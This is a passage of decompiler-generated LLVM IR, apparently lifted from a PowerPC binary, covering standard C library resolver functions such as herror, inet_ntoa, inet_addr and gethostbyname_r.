  br i1 %v2_1000fdcc, label %dec_label_pc_1000fdec, label %dec_label_pc_1000fde0

dec_label_pc_1000fde0:                            ; preds = %entry
  %v1_1000fdd8 = mul i32 %arg1, 4
  %v2_1000fde8 = add i32 %v1_1000fdd8, ptrtoint ([5 x i8*]* @global_var_1001a200.621 to i32)
  %v3_1000fde8 = inttoptr i32 %v2_1000fde8 to i32*
  %v4_1000fde8 = load i32, i32* %v3_1000fde8, align 4
  br label %dec_label_pc_1000fdec

dec_label_pc_1000fdec:                            ; preds = %entry, %dec_label_pc_1000fde0
  %v0_1000fdec = phi i32 [ ptrtoint ([15 x i8]* @global_var_1001a214.615 to i32), %entry ], [ %v4_1000fde8, %dec_label_pc_1000fde0 ]
  ret i32 %v0_1000fdec

; uselistorder directives
  uselistorder label %dec_label_pc_1000fdec, { 1, 0 }
}

define i32 @__GI_herror(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000fdf8 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* %r31.global-to-local, align 4
  %v4_1000fe04 = icmp eq i8* %arg1, null
  store i32 ptrtoint (i32* @global_var_1001a226.622 to i32), i32* %r30.global-to-local, align 4
  br i1 %v4_1000fe04, label %dec_label_pc_1000fe28, label %dec_label_pc_1000fe14

dec_label_pc_1000fe14:                            ; preds = %entry
  %v2_1000fe14 = load i8, i8* %arg1, align 1
  %v3_1000fe18 = icmp eq i8 %v2_1000fe14, 0
  br i1 %v3_1000fe18, label %dec_label_pc_1000fe28, label %dec_label_pc_1000fe20

dec_label_pc_1000fe20:                            ; preds = %dec_label_pc_1000fe14
  store i32 ptrtoint ([3 x i8]* @global_var_1001a224.623 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000fe28

dec_label_pc_1000fe28:                            ; preds = %dec_label_pc_1000fe14, %entry, %dec_label_pc_1000fe20
  %v0_1000fe28 = call i32 @__GI___h_errno_location()
  %v1_1000fe30 = inttoptr i32 %v0_1000fe28 to i32*
  %v2_1000fe30 = load i32, i32* %v1_1000fe30, align 4
  %v2_1000fe38 = icmp ugt i32 %v2_1000fe30, 4
  br i1 %v2_1000fe38, label %dec_label_pc_1000fe50, label %dec_label_pc_1000fe44

dec_label_pc_1000fe44:                            ; preds = %dec_label_pc_1000fe28
  br label %dec_label_pc_1000fe50

dec_label_pc_1000fe50:                            ; preds = %dec_label_pc_1000fe28, %dec_label_pc_1000fe44
  %v3_1000fe5c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 -21628) to i32*), align 4
  store i32 %v3_1000fe5c, i32* @r3, align 4
  store i32 %v0_1000fdf8, i32* @lr, align 4
  %v0_1000fe64 = load i32, i32* %r31.global-to-local, align 4
  %v0_1000fe68 = load i32, i32* %r30.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1001a18c.624 to i32), i32* @r4, align 4
  %v7_1000fe7c = call i32 @fprintf(i32 %v3_1000fe5c, i32 ptrtoint ([8 x i8]* @global_var_1001a18c.624 to i32), i32 %v0_1000fe64, i32 %v0_1000fe68, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  ret i32 %v7_1000fe7c

; uselistorder directives
  uselistorder i32* %r30.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000fe50, { 1, 0 }
  uselistorder label %dec_label_pc_1000fe28, { 2, 0, 1 }
}

define i32 @__GI_inet_ntoa_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v1_1000fe88 = add i32 %arg2, 15
  store i32 %v1_1000fe88, i32* %r4.global-to-local, align 4
  %v2_1000fe9c = load i32, i32* %arg1, align 4
  store i32 %v2_1000fe9c, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000fea4

dec_label_pc_1000fea4:                            ; preds = %dec_label_pc_1000fec8.dec_label_pc_1000fea4_crit_edge, %entry
  %v0_1000fea4 = phi i32 [ %v2_1000fe9c, %entry ], [ %v0_1000fea4.pre, %dec_label_pc_1000fec8.dec_label_pc_1000fea4_crit_edge ]
  %v0_1000fee88 = phi i32 [ %v1_1000fe88, %entry ], [ %v0_1000fec8, %dec_label_pc_1000fec8.dec_label_pc_1000fea4_crit_edge ]
  %v1_1000fea4 = urem i32 %v0_1000fea4, 256
  %v5_1000feac = inttoptr i32 %v0_1000fee88 to i8*
  %v6_1000feac = call i32 @_uintmaxtostr(i8* %v5_1000feac, i32 0, i32 %v1_1000fea4, i32 -10, i32 0)
  %v0_1000feb0 = load i32, i32* @r30, align 4
  %v3_1000feb0 = icmp eq i32 %v0_1000feb0, 0
  %v0_1000feb4 = load i32, i32* @r31, align 4
  %v1_1000feb4 = udiv i32 %v0_1000feb4, 256
  store i32 %v1_1000feb4, i32* %r31.global-to-local, align 4
  %v1_1000feb8 = add i32 %v6_1000feac, -1
  store i32 %v1_1000feb8, i32* %r4.global-to-local, align 4
  br i1 %v3_1000feb0, label %dec_label_pc_1000fec8, label %dec_label_pc_1000fec0

dec_label_pc_1000fec0:                            ; preds = %dec_label_pc_1000fea4
  %v3_1000fec4 = inttoptr i32 %v0_1000feb0 to i8*
  store i8 46, i8* %v3_1000fec4, align 1
  %v0_1000fec8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000fec8

dec_label_pc_1000fec8:                            ; preds = %dec_label_pc_1000fea4, %dec_label_pc_1000fec0
  %v0_1000fec8 = phi i32 [ %v1_1000feb8, %dec_label_pc_1000fea4 ], [ %v0_1000fec8.pre, %dec_label_pc_1000fec0 ]
  %v0_1000fecc.pre = load i32, i32* @r29, align 4
  %v1_1000fedc = add i32 %v0_1000fecc.pre, 1
  store i32 %v1_1000fedc, i32* @r29, align 4
  %tmp7 = icmp slt i32 %v0_1000fecc.pre, 4
  br i1 %tmp7, label %dec_label_pc_1000fec8.dec_label_pc_1000fea4_crit_edge, label %dec_label_pc_1000fee4

dec_label_pc_1000fec8.dec_label_pc_1000fea4_crit_edge: ; preds = %dec_label_pc_1000fec8
  %v0_1000fea4.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000fea4

dec_label_pc_1000fee4:                            ; preds = %dec_label_pc_1000fec8
  %v1_1000fee8 = add i32 %v0_1000fec8, 1
  ret i32 %v1_1000fee8

; uselistorder directives
  uselistorder i32 %v0_1000fecc.pre, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000fec8, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_1000ff10 = load i32, i32* %arg1, align 4
  store i32 %v2_1000ff10, i32* %stack_var_-8, align 4
  store i32 268500768, i32* @lr, align 4
  %v3_1000ff1c = call i32 @__GI_inet_ntoa_r(i32* nonnull %stack_var_-8, i32 ptrtoint (i32* @global_var_10030c48.625 to i32))
  ret i32 %v3_1000ff1c
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_1000ff38 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000ff38, i32* @r4, align 4
  store i32 268500804, i32* @lr, align 4
  %v1_1000ff40 = bitcast i32* %stack_var_-24 to i8*
  %v2_1000ff40 = call i32 @inet_aton(i8* %v1_1000ff40)
  %v3_1000ff44 = icmp eq i32 %v2_1000ff40, 0
  br i1 %v3_1000ff44, label %dec_label_pc_1000ff54, label %dec_label_pc_1000ff50

dec_label_pc_1000ff50:                            ; preds = %entry
  %v3_1000ff50 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000ff54

dec_label_pc_1000ff54:                            ; preds = %entry, %dec_label_pc_1000ff50
  %v0_1000ff60 = phi i32 [ -1, %entry ], [ %v3_1000ff50, %dec_label_pc_1000ff50 ]
  ret i32 %v0_1000ff60

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000ff54, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v0_1000ff78 = call i32 @__GI___h_errno_location()
  %v2_1000ff88 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268500896, i32* @lr, align 4
  %v7_1000ff9c = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_10030e24.626, i32 ptrtoint (i32* @global_var_10030c58.627 to i32), i32 460, i32 %v2_1000ff88, i32 %v0_1000ff78)
  %v3_1000ffa4 = load i32, i32* %stack_var_-40, align 4
  ret i32 %v3_1000ffa4
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %v0_1000ffbc = load i32, i32* @lr, align 4
  store i32 %v0_1000ffbc, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r23, align 4
  %v3_1000ffc4 = icmp eq i32 %arg1, 0
  store i32 0, i32* @r31, align 4
  store i32 %arg5, i32* %r20.global-to-local, align 4
  store i32 %tmp, i32* %r26.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg4, i32* %r29.global-to-local, align 4
  store i32 %arg6, i32* @r24, align 4
  %v2_1000ffe4 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v2_1000ffe4, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  br i1 %v3_1000ffc4, label %dec_label_pc_100102e8, label %dec_label_pc_1000fff0

dec_label_pc_1000fff0:                            ; preds = %entry
  %v0_1000fff0 = call i32 @__errno_location()
  store i32 %v0_1000fff0, i32* %r3.global-to-local, align 4
  %v1_1000fff8 = inttoptr i32 %v0_1000fff0 to i32*
  %v2_1000fff8 = load i32, i32* %v1_1000fff8, align 4
  store i32 %v2_1000fff8, i32* @r27, align 4
  store i32 %v0_1000fff0, i32* %r28.global-to-local, align 4
  %v0_10010000 = load i32, i32* @r31, align 4
  store i32 %v0_10010000, i32* %v1_1000fff8, align 4
  %v0_10010004 = load i32, i32* %r26.global-to-local, align 4
  %v0_10010008 = load i32, i32* @r23, align 4
  store i32 %v0_10010008, i32* %r3.global-to-local, align 4
  %v0_1001000c = load i32, i32* %r30.global-to-local, align 4
  %v0_10010010 = load i32, i32* %r29.global-to-local, align 4
  %v0_10010014 = load i32, i32* %r20.global-to-local, align 4
  %v0_10010018 = load i32, i32* @r24, align 4
  store i32 268501024, i32* @lr, align 4
  %v7_1001001c = call i32 @__get_hosts_byname_r(i32 %v0_10010008, i32 2, i32 %v0_10010004, i32 %v0_1001000c, i32 %v0_10010010, i32 %v0_10010014, i32 %v0_10010018)
  store i32 %v7_1001001c, i32* %r3.global-to-local, align 4
  %v3_10010020 = icmp eq i32 %v7_1001001c, 0
  br i1 %v3_10010020, label %dec_label_pc_100102e8, label %dec_label_pc_10010028

dec_label_pc_10010028:                            ; preds = %dec_label_pc_1000fff0
  %v0_10010028 = load i32, i32* @r24, align 4
  %v1_10010028 = inttoptr i32 %v0_10010028 to i32*
  %v2_10010028 = load i32, i32* %v1_10010028, align 4
  store i32 %v2_10010028, i32* %r0.global-to-local, align 4
  %v3_1001002c = icmp eq i32 %v2_10010028, 1
  br i1 %v3_1001002c, label %dec_label_pc_10010050, label %dec_label_pc_10010034

dec_label_pc_10010034:                            ; preds = %dec_label_pc_10010028
  %v3_10010034 = icmp eq i32 %v2_10010028, 4
  br i1 %v3_10010034, label %dec_label_pc_10010050, label %dec_label_pc_1001003c

dec_label_pc_1001003c:                            ; preds = %dec_label_pc_10010034
  %v3_1001003c = icmp eq i32 %v2_10010028, -1
  br i1 %v3_1001003c, label %dec_label_pc_10010044, label %dec_label_pc_100102e8

dec_label_pc_10010044:                            ; preds = %dec_label_pc_1001003c
  %v0_10010044 = load i32, i32* @r28, align 4
  %v1_10010044 = inttoptr i32 %v0_10010044 to i32*
  %v2_10010044 = load i32, i32* %v1_10010044, align 4
  store i32 %v2_10010044, i32* %r0.global-to-local, align 4
  %v3_10010048 = icmp eq i32 %v2_10010044, 2
  br i1 %v3_10010048, label %dec_label_pc_10010050, label %dec_label_pc_100102e8

dec_label_pc_10010050:                            ; preds = %dec_label_pc_10010044, %dec_label_pc_10010034, %dec_label_pc_10010028
  %v0_10010050 = load i32, i32* @r30, align 4
  %v1_10010050 = sub i32 0, %v0_10010050
  store i32 %v1_10010050, i32* %r0.global-to-local, align 4
  %v0_10010054 = load i32, i32* @r27, align 4
  %v1_10010054 = load i32, i32* @r28, align 4
  %v2_10010054 = inttoptr i32 %v1_10010054 to i32*
  store i32 %v0_10010054, i32* %v2_10010054, align 4
  %v0_10010058 = load i32, i32* %r0.global-to-local, align 4
  %v1_10010058 = urem i32 %v0_10010058, 4
  store i32 %v1_10010058, i32* %r0.global-to-local, align 4
  %v3_10010058 = icmp eq i32 %v1_10010058, 0
  %v0_10010070.pre = load i32, i32* @r29, align 4
  br i1 %v3_10010058, label %dec_label_pc_10010070, label %dec_label_pc_10010060

dec_label_pc_10010060:                            ; preds = %dec_label_pc_10010050
  %v2_10010060 = icmp ult i32 %v0_10010070.pre, %v1_10010058
  br i1 %v2_10010060, label %dec_label_pc_100102e4, label %dec_label_pc_10010068

dec_label_pc_10010068:                            ; preds = %dec_label_pc_10010060
  %v2_10010068 = sub i32 %v0_10010070.pre, %v1_10010058
  store i32 %v2_10010068, i32* @r29, align 4
  %v0_1001006c = load i32, i32* @r30, align 4
  %v2_1001006c = add i32 %v0_1001006c, %v1_10010058
  store i32 %v2_1001006c, i32* @r30, align 4
  br label %dec_label_pc_10010070

dec_label_pc_10010070:                            ; preds = %dec_label_pc_10010050, %dec_label_pc_10010068
  %v0_10010070 = phi i32 [ %v2_10010068, %dec_label_pc_10010068 ], [ %v0_10010070.pre, %dec_label_pc_10010050 ]
  %v1_10010078 = load i32, i32* @r24, align 4
  %v2_10010078 = inttoptr i32 %v1_10010078 to i32*
  store i32 -1, i32* %v2_10010078, align 4
  %tmp29 = icmp ult i32 %v0_10010070, 4
  br i1 %tmp29, label %dec_label_pc_100102e4, label %dec_label_pc_10010080

dec_label_pc_10010080:                            ; preds = %dec_label_pc_10010070
  %v0_10010080 = load i32, i32* @r29, align 4
  %v1_10010080 = add i32 %v0_10010080, -4
  store i32 %v1_10010080, i32* %r0.global-to-local, align 4
  %tmp30 = icmp ult i32 %v1_10010080, 8
  br i1 %tmp30, label %dec_label_pc_100102e4, label %dec_label_pc_1001008c

dec_label_pc_1001008c:                            ; preds = %dec_label_pc_10010080
  %v1_1001008c = add i32 %v0_10010080, -12
  store i32 %v1_1001008c, i32* %r0.global-to-local, align 4
  %v0_10010090 = load i32, i32* @r30, align 4
  %v1_10010090 = add i32 %v0_10010090, 4
  store i32 %v1_10010090, i32* %r25.global-to-local, align 4
  store i32 0, i32* %r28.global-to-local, align 4
  %v3_1001009c = inttoptr i32 %v1_10010090 to i32*
  store i32 %v0_10010090, i32* %v3_1001009c, align 4
  %v0_100100a0 = load i32, i32* %r28.global-to-local, align 4
  %v1_100100a0 = load i32, i32* %r25.global-to-local, align 4
  %v2_100100a0 = add i32 %v1_100100a0, 4
  %v3_100100a0 = inttoptr i32 %v2_100100a0 to i32*
  store i32 %v0_100100a0, i32* %v3_100100a0, align 4
  %tmp31 = icmp ult i32 %v1_1001008c, 32
  br i1 %tmp31, label %dec_label_pc_100102e4, label %dec_label_pc_100100a8

dec_label_pc_100100a8:                            ; preds = %dec_label_pc_1001008c
  %v0_100100a8 = load i32, i32* @r29, align 4
  %v1_100100a8 = add i32 %v0_100100a8, -44
  %tmp32 = icmp ult i32 %v1_100100a8, 256
  br i1 %tmp32, label %dec_label_pc_100102e4, label %dec_label_pc_100100b4

dec_label_pc_100100b4:                            ; preds = %dec_label_pc_100100a8
  %v0_100100b4 = load i32, i32* @r30, align 4
  %v1_100100b4 = add i32 %v0_100100b4, 44
  store i32 %v1_100100b4, i32* @r31, align 4
  %v0_100100b8 = load i32, i32* @r23, align 4
  store i32 %v0_100100b8, i32* @r4, align 4
  %v1_100100c0 = add i32 %v0_100100b4, 12
  store i32 %v1_100100c0, i32* %r21.global-to-local, align 4
  store i32 %v1_100100b4, i32* %r3.global-to-local, align 4
  store i32 268501196, i32* @lr, align 4
  %v3_100100c8 = call i32 @strncpy(i32 %v1_100100b4, i32 %v0_100100b8, i32 %v1_100100a8)
  %v0_100100cc = load i32, i32* @r31, align 4
  %v1_100100cc = load i32, i32* @r30, align 4
  %v2_100100cc = add i32 %v1_100100cc, 12
  %v3_100100cc = inttoptr i32 %v2_100100cc to i32*
  store i32 %v0_100100cc, i32* %v3_100100cc, align 4
  %v0_100100d0 = load i32, i32* %r28.global-to-local, align 4
  %v1_100100d0 = load i32, i32* %r21.global-to-local, align 4
  %v2_100100d0 = add i32 %v1_100100d0, 4
  %v3_100100d0 = inttoptr i32 %v2_100100d0 to i32*
  store i32 %v0_100100d0, i32* %v3_100100d0, align 4
  %v0_100100d4 = load i32, i32* @r23, align 4
  store i32 %v0_100100d4, i32* %r3.global-to-local, align 4
  %v0_100100d8 = load i32, i32* @r30, align 4
  store i32 %v0_100100d8, i32* @r4, align 4
  store i32 268501216, i32* @lr, align 4
  %v2_100100dc = inttoptr i32 %v0_100100d4 to i8*
  %v3_100100dc = call i32 @inet_aton(i8* %v2_100100dc)
  store i32 %v3_100100dc, i32* %r3.global-to-local, align 4
  store i32 %v3_100100dc, i32* %r22.global-to-local, align 4
  %v3_100100e0 = icmp eq i32 %v3_100100dc, 0
  br i1 %v3_100100e0, label %dec_label_pc_10010114, label %dec_label_pc_100100e8

dec_label_pc_100100e8:                            ; preds = %dec_label_pc_100100b4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_100100f0 = load i32, i32* @r26, align 4
  %v2_100100f0 = add i32 %v1_100100f0, 8
  %v3_100100f0 = inttoptr i32 %v2_100100f0 to i32*
  store i32 2, i32* %v3_100100f0, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_100100f8 = load i32, i32* @r31, align 4
  %v1_100100f8 = load i32, i32* @r26, align 4
  %v2_100100f8 = inttoptr i32 %v1_100100f8 to i32*
  store i32 %v0_100100f8, i32* %v2_100100f8, align 4
  %v0_100100fc = load i32, i32* %r0.global-to-local, align 4
  %v1_100100fc = load i32, i32* @r26, align 4
  %v2_100100fc = add i32 %v1_100100fc, 12
  %v3_100100fc = inttoptr i32 %v2_100100fc to i32*
  store i32 %v0_100100fc, i32* %v3_100100fc, align 4
  %v0_10010100 = load i32, i32* %r25.global-to-local, align 4
  %v1_10010100 = load i32, i32* @r26, align 4
  %v2_10010100 = add i32 %v1_10010100, 16
  %v3_10010100 = inttoptr i32 %v2_10010100 to i32*
  store i32 %v0_10010100, i32* %v3_10010100, align 4
  %v0_10010104 = load i32, i32* %r21.global-to-local, align 4
  %v1_10010104 = load i32, i32* @r26, align 4
  %v2_10010104 = add i32 %v1_10010104, 4
  %v3_10010104 = inttoptr i32 %v2_10010104 to i32*
  store i32 %v0_10010104, i32* %v3_10010104, align 4
  %v0_10010108 = load i32, i32* @r26, align 4
  %v1_10010108 = load i32, i32* @r20, align 4
  %v2_10010108 = inttoptr i32 %v1_10010108 to i32*
  store i32 %v0_10010108, i32* %v2_10010108, align 4
  %v0_1001010c = load i32, i32* %r28.global-to-local, align 4
  %v1_1001010c = load i32, i32* @r24, align 4
  %v2_1001010c = inttoptr i32 %v1_1001010c to i32*
  store i32 %v0_1001010c, i32* %v2_1001010c, align 4
  br label %dec_label_pc_100102e8

dec_label_pc_10010114:                            ; preds = %dec_label_pc_100100b4
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r29.global-to-local, align 4
  store i32 268501276, i32* @lr, align 4
  %v0_10010118 = call i32 @__open_nameservers()
  store i32 ptrtoint (i32* @global_var_1002ab28.628 to i32), i32* %r29.global-to-local, align 4
  %v2_10010120 = ptrtoint i32* %stack_var_-116 to i32
  store i32 %v2_10010120, i32* %r28.global-to-local, align 4
  store i32 %v2_10010120, i32* @r3, align 4
  %v0_10010134 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_1002ab28.628 to i32), i32* %r3.global-to-local, align 4
  %v0_1001013c = call i32 @__pthread_return_0()
  %v3_10010144 = load i32, i32* @global_var_1002ac14.629, align 4
  store i32 %v3_10010144, i32* %r29.global-to-local, align 4
  store i32 %v2_10010120, i32* @r3, align 4
  %v0_10010150 = call i32 @__pthread_return_void()
  %v0_10010158 = load i32, i32* @r23, align 4
  store i32 %v0_10010158, i32* %r3.global-to-local, align 4
  %v2_10010168 = ptrtoint i32* %stack_var_-120 to i32
  %v2_1001016c = ptrtoint i32* %stack_var_-100 to i32
  %v0_10010170 = load i32, i32* %r22.global-to-local, align 4
  store i32 268501376, i32* @lr, align 4
  %v6_1001017c = inttoptr i32 %v0_10010158 to i8*
  %v7_1001017c = call i32 @__dns_lookup(i8* %v6_1001017c, i32 1, i32 %v3_10010144, i32 ptrtoint (i32* @global_var_10030f10.630 to i32), i32 %v2_10010168, i32 %v2_1001016c)
  store i32 %v7_1001017c, i32* %r3.global-to-local, align 4
  %v1_10010180 = icmp slt i32 %v7_1001017c, 0
  br i1 %v1_10010180, label %dec_label_pc_100102c8, label %dec_label_pc_10010188

dec_label_pc_10010188:                            ; preds = %dec_label_pc_10010114
  store i32 %tmp19, i32* %r11.global-to-local, align 4
  %v1_10010190 = add i32 %tmp19, 4
  %v2_10010194 = mul i32 %v0_10010170, %v1_10010190
  %v1_10010198 = add i32 %v2_10010194, 256
  %v1_1001019c = load i32, i32* @r27, align 4
  %v3_1001019c = icmp ugt i32 %v1_10010198, %v1_1001019c
  br i1 %v3_1001019c, label %dec_label_pc_100101a4, label %dec_label_pc_100101c0

dec_label_pc_100101a4:                            ; preds = %dec_label_pc_10010188
  %v3_100101a4 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_100101a4, i32* %r3.global-to-local, align 4
  store i32 268501420, i32* @lr, align 4
  %v1_100101a8 = call i32 @free(i32 %v3_100101a4)
  %v3_100101ac = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_100101ac, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100101b4.631 to i32), i32* @lr, align 4
  %v1_100101b0 = call i32 @free(i32 %v3_100101ac)
  store i32 34, i32* %r3.global-to-local, align 4
  %v0_100101b8 = load i32, i32* @r19, align 4
  %v1_100101b8 = load i32, i32* @r24, align 4
  %v2_100101b8 = inttoptr i32 %v1_100101b8 to i32*
  store i32 %v0_100101b8, i32* %v2_100101b8, align 4
  br label %dec_label_pc_100102e8

dec_label_pc_100101c0:                            ; preds = %dec_label_pc_10010188
  %v3_100101c0 = icmp eq i32 %v0_10010170, 0
  br i1 %v3_100101c0, label %dec_label_pc_100101c0.dec_label_pc_10010264_crit_edge, label %dec_label_pc_100101c8

dec_label_pc_100101c0.dec_label_pc_10010264_crit_edge: ; preds = %dec_label_pc_100101c0
  %v0_1001026c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10010264

dec_label_pc_100101c8:                            ; preds = %dec_label_pc_100101c0
  %v2_100101c8 = mul i32 %v0_10010170, %tmp19
  store i32 %v2_100101c8, i32* @r5, align 4
  %v0_100101cc = load i32, i32* @r30, align 4
  %v1_100101cc = add i32 %v0_100101cc, 36
  store i32 %v1_100101cc, i32* %r3.global-to-local, align 4
  %v0_100101d0 = load i32, i32* @r31, align 4
  store i32 268501464, i32* @lr, align 4
  %v2_100101d4 = call i32 @memmove(i32 %v1_100101cc, i32 %v0_100101d0)
  store i32 %v2_100101d4, i32* %r3.global-to-local, align 4
  store i32 %v2_100101c8, i32* %r0.global-to-local, align 4
  %v0_100101e4 = load i32, i32* @r30, align 4
  %v1_100101e4 = load i32, i32* @r31, align 4
  %v3_100101e4 = add i32 %v1_100101e4, %v2_100101c8
  %v4_100101e4 = inttoptr i32 %v3_100101e4 to i32*
  store i32 %v0_100101e4, i32* %v4_100101e4, align 4
  %v0_100101e8 = load i32, i32* @r31, align 4
  %v1_100101e8 = load i32, i32* %r0.global-to-local, align 4
  %v2_100101e8 = add i32 %v1_100101e8, %v0_100101e8
  store i32 %v2_100101e8, i32* @r25, align 4
  %v1_100101f0 = add i32 %v0_10010170, -1
  store i32 %v1_100101f0, i32* %r11.global-to-local, align 4
  %v1_100101f4 = add i32 %v0_10010170, 1
  %v2_100101f8 = icmp sgt i32 %v1_100101f0, -1
  store i32 %v1_100101f4, i32* %ctr.global-to-local, align 4
  br i1 %v2_100101f8, label %dec_label_pc_10010228.preheader, label %dec_label_pc_10010204

dec_label_pc_10010204:                            ; preds = %dec_label_pc_100101c8
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10010228.preheader

dec_label_pc_10010228.preheader:                  ; preds = %dec_label_pc_10010204, %dec_label_pc_100101c8
  %v0_100102306 = phi i32 [ 1, %dec_label_pc_10010204 ], [ %v1_100101f4, %dec_label_pc_100101c8 ]
  %v1_100102283 = mul i32 %v1_100101f0, 4
  store i32 %v1_100102283, i32* %r0.global-to-local, align 4
  %v2_1001022c5 = add i32 %v2_100101e8, %v1_100102283
  %v1_100102307 = add i32 %v0_100102306, -1
  store i32 %v1_100102307, i32* %ctr.global-to-local, align 4
  %v2_100102308 = icmp eq i32 %v1_100102307, 0
  br i1 %v2_100102308, label %dec_label_pc_10010234, label %dec_label_pc_10010210

dec_label_pc_10010210:                            ; preds = %dec_label_pc_10010228.preheader, %dec_label_pc_10010210.dec_label_pc_10010210_crit_edge
  %v1_10010224 = phi i32 [ %v2_1001022c, %dec_label_pc_10010210.dec_label_pc_10010210_crit_edge ], [ %v2_1001022c5, %dec_label_pc_10010228.preheader ]
  %v0_1001021c = phi i32 [ %v0_1001021c.pre, %dec_label_pc_10010210.dec_label_pc_10010210_crit_edge ], [ %v0_100101e8, %dec_label_pc_10010228.preheader ]
  %v0_10010214 = phi i32 [ %v0_10010228, %dec_label_pc_10010210.dec_label_pc_10010210_crit_edge ], [ %v1_100101f0, %dec_label_pc_10010228.preheader ]
  %v2_10010214 = mul i32 %v0_10010214, %tmp19
  %v1_10010218 = add i32 %v0_10010214, -1
  store i32 %v1_10010218, i32* %r11.global-to-local, align 4
  %v2_1001021c = add i32 %v0_1001021c, -8
  %v1_10010220 = add i32 %v2_1001021c, %v2_10010214
  %v2_10010224 = add i32 %v1_10010224, 4
  %v3_10010224 = inttoptr i32 %v2_10010224 to i32*
  store i32 %v1_10010220, i32* %v3_10010224, align 4
  %v0_10010228 = load i32, i32* %r11.global-to-local, align 4
  %v1_10010228 = mul i32 %v0_10010228, 4
  store i32 %v1_10010228, i32* %r0.global-to-local, align 4
  %v1_1001022c = load i32, i32* @r25, align 4
  %v0_10010230 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10010230 = add i32 %v0_10010230, -1
  store i32 %v1_10010230, i32* %ctr.global-to-local, align 4
  %v2_10010230 = icmp eq i32 %v1_10010230, 0
  br i1 %v2_10010230, label %dec_label_pc_10010234, label %dec_label_pc_10010210.dec_label_pc_10010210_crit_edge

dec_label_pc_10010210.dec_label_pc_10010210_crit_edge: ; preds = %dec_label_pc_10010210
  %v2_1001022c = add i32 %v1_1001022c, %v1_10010228
  %v0_1001021c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10010210

dec_label_pc_10010234:                            ; preds = %dec_label_pc_10010210, %dec_label_pc_10010228.preheader
  %v1_10010240 = phi i32 [ %v2_100101e8, %dec_label_pc_10010228.preheader ], [ %v1_1001022c, %dec_label_pc_10010210 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1001023c = mul i32 %v0_10010170, 4
  %v2_10010240 = add i32 %v1_1001023c, 4
  %v2_10010244 = add i32 %v2_10010240, %v1_10010240
  %v3_10010244 = inttoptr i32 %v2_10010244 to i32*
  store i32 0, i32* %v3_10010244, align 4
  %v0_10010250 = load i32, i32* @r25, align 4
  %v2_10010250 = add i32 %v0_10010250, %v1_1001023c
  store i32 %v2_10010250, i32* %r11.global-to-local, align 4
  %v1_10010254 = load i32, i32* @r31, align 4
  %v2_10010254 = sub i32 %v1_10010254, %v2_10010250
  %v1_10010258 = add i32 %v2_10010250, 8
  store i32 %v1_10010258, i32* @r31, align 4
  %v0_1001025c = load i32, i32* @r27, align 4
  %v2_1001025c = add i32 %v0_1001025c, %v2_10010254
